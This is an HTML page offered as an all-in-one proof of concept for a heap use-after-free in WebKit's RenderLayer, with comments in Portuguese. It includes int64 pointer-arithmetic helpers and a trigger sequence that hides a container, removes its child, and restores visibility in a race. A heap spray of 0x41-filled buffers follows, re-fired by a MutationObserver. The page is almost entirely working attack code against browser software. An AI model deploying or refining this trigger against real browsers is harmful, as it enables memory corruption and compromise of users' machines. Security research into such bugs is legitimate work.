<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Heap UaF PoC (All-in-One)</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; padding: 20px; }
        .container { 
            border: 2px dashed #333; 
            padding: 20px; 
            margin-bottom: 20px; 
            background: #fff;
        }
        .child { 
            width: 100px; 
            height: 100px; 
            background-color: blue; 
            border: 2px solid darkblue;
        }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
        #log-area { margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px; }
    </style>
</head>
<body>

    <h2>WebKit UaF PoC (RenderLayer)</h2>
    <p>Clique abaixo para iniciar a sequência de trigger.</p>
    <button onclick="runExploit()">Iniciar PoC</button>

    <div class="container">
        <div class="child"></div>
    </div>

    <div id="log-area"><h3>Logs:</h3></div>

<script>
/* ==========================================
   PARTE 1: int64.mjs (Matemática de Ponteiros)
   ========================================== */

function check_range(x) {
    return (-0x80000000 <= x) && (x <= 0xffffffff);
}

function unhexlify(hexstr) {
    if (hexstr.substring(0, 2) === "0x") {
        hexstr = hexstr.substring(2);
    }
    if (hexstr.length % 2 === 1) {
        hexstr = '0' + hexstr;
    }
    if (hexstr.length % 2 === 1) {
        throw TypeError("Invalid hex string");
    }

    let bytes = new Uint8Array(hexstr.length / 2);
    for (let i = 0; i < hexstr.length; i += 2) {
        let new_i = hexstr.length - 2 - i;
        let substr = hexstr.slice(new_i, new_i + 2);
        bytes[i / 2] = parseInt(substr, 16);
    }

    return bytes;
}

function operation(f, nargs) {
    return function () {
        if (arguments.length !== nargs)
            throw Error("Not enough arguments for function " + f.name);
        let new_args = [];
        for (let i = 0; i < arguments.length; i++) {
            if (!(arguments[i] instanceof Int)) {
                new_args[i] = new Int(arguments[i]);
            } else {
                new_args[i] = arguments[i];
            }
        }
        return f.apply(this, new_args);
    };
}

class Int {
    constructor(low, high) {
        let buffer = new Uint32Array(2);
        let bytes = new Uint8Array(buffer.buffer);

        if (arguments.length > 2) {
            throw TypeError('Int takes at most 2 args');
        }
        if (arguments.length === 0) {
            throw TypeError('Int takes at min 1 args');
        }
        let is_one = false;
        if (arguments.length === 1) {
            is_one = true;
        }

        if (!is_one) {
            if (typeof (low) !== 'number'
                && typeof (high) !== 'number') {
                throw TypeError('low/high must be numbers');
            }
        }

        if (typeof low === 'number') {
            if (!check_range(low)) {
                throw TypeError('low not a valid value: ' + low);
            }
            if (is_one) {
                high = 0;
                if (low < 0) {
                    high = -1;
                }
            } else {
                if (!check_range(high)) {
                    throw TypeError('high not a valid value: ' + high);
                }
            }
            buffer[0] = low;
            buffer[1] = high;
        } else if (typeof low === 'string') {
            bytes.set(unhexlify(low));
        } else if (typeof low === 'object') {
            if (low instanceof Int) {
                bytes.set(low.bytes);
            } else {
                if (low.length !== 8)
                    throw TypeError("Array must have exactly 8 elements.");
                bytes.set(low);
            }
        } else {
            throw TypeError('Int does not support your object for conversion');
        }

        this.buffer = buffer;
        this.bytes = bytes;

        this.eq = operation(function eq(b) {
            const a = this;
            return a.low() === b.low() && a.high() === b.high();
        }, 1);

        this.neg = operation(function neg() {
            let type = this.constructor;
            let low = ~this.low();
            let high = ~this.high();
            let res = (new Int(low, high)).add(1);
            return new type(res);
        }, 0);

        this.add = operation(function add(b) {
            let type = this.constructor;
            let low = this.low();
            let high = this.high();
            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();
            low &= 0xffffffff;
            high &= 0xffffffff;
            return new type(low, high);
        }, 1);

        this.sub = operation(function sub(b) {
            let type = this.constructor;
            b = b.neg();
            let low = this.low();
            let high = this.high();
            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();
            low &= 0xffffffff;
            high &= 0xffffffff;
            return new type(low, high);
        }, 1);
    }

    low() { return this.buffer[0]; }
    high() { return this.buffer[1]; }

    toString(is_pretty) {
        if (!is_pretty) {
            let low = this.low().toString(16).padStart(8, '0');
            let high = this.high().toString(16).padStart(8, '0');
            return '0x' + high + low;
        }
        let high = this.high().toString(16).padStart(8, '0');
        high = high.substring(0, 4) + '_' + high.substring(4);
        let low = this.low().toString(16).padStart(8, '0');
        low = low.substring(0, 4) + '_' + low.substring(4);
        return '0x' + high + '_' + low;
    }
}
Int.Zero = new Int(0);
Int.One = new Int(1);


/* ==========================================
   PARTE 2: utils.mjs (Utilitários)
   ========================================== */

function die(msg) {
    alert(msg);
    // undefinedFunction(); // Comentado para não parar o script de forma feia no teste
    throw new Error(msg);
}

function debug_log(msg) {
    let textNode = document.createTextNode(msg);
    let p = document.createElement("p");
    p.appendChild(textNode);
    // Modificado para anexar ao log-area se existir, senão ao body
    let logArea = document.getElementById("log-area") || document.body;
    logArea.appendChild(p);
    console.log(msg);
}

function clear_log() {
    let logArea = document.getElementById("log-area");
    if(logArea) logArea.innerHTML = "<h3>Logs:</h3>";
    else document.body.innerHTML = null;
}

function str2array(str, length, offset) {
    if (offset === undefined) {
        offset = 0;
    }
    let a = new Array(length);
    for (let i = 0; i < length; i++) {
        a[i] = str.charCodeAt(i + offset);
    }
    return a;
}

function align(a, alignment) {
    if (!(a instanceof Int)) {
        a = new Int(a);
    }
    const mask = -alignment & 0xffffffff;
    let type = a.constructor;
    let low = a.low() & mask;
    return new type(low, a.high());
}


/* ==========================================
   PARTE 3: poc.js (Lógica do Exploit)
   ========================================== */

// Seletores globais
let container;
let child;

function initDomElements() {
    container = document.querySelector(".container");
    child = document.querySelector(".child");
}

function heapSpray() {
  debug_log("Iniciando Heap Spray...");
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41; // Preenche com 'A'
    }
    spray.push(arr);
  }
  debug_log("Heap Spray concluído.");
  return spray;
}

function triggerUAF() {
  if(!container || !child) {
      debug_log("Erro: Elementos DOM não encontrados. Reiniciando referências.");
      initDomElements();
      if(!child) { // Se child foi removido anteriormente, precisamos recriar para testar de novo
          debug_log("Recriando elemento filho...");
          child = document.createElement("div");
          child.className = "child";
          container.appendChild(child);
      }
  }

  debug_log("Alterando content-visibility para hidden...");
  container.style.contentVisibility = "hidden";
  
  debug_log("Removendo elemento filho (Free)...");
  child.remove();
  
  // setTimeout com 0ms cria a condição de corrida
  setTimeout(() => {
    debug_log("Restaurando content-visibility (Trigger Recompute)...");
    container.style.contentVisibility = "auto";
    
    // Tenta ocupar a memória liberada imediatamente
    let spray = heapSpray();
    
    debug_log("UAF disparado. Se o navegador não travar, a memória pode estar corrompida.");
  }, 0);
}

// Configuração do MutationObserver
const observer = new MutationObserver(() => {
  debug_log("Árvore DOM modificada (Observer), tentando UAF...");
  triggerUAF();
});

// Função ligada ao botão
function runExploit() {
    initDomElements();
    
    // Ativa o observer
    observer.observe(container, { childList: true, subtree: true });
    
    debug_log("Iniciando sequência manual...");
    triggerUAF();
}

</script>
</body>
</html>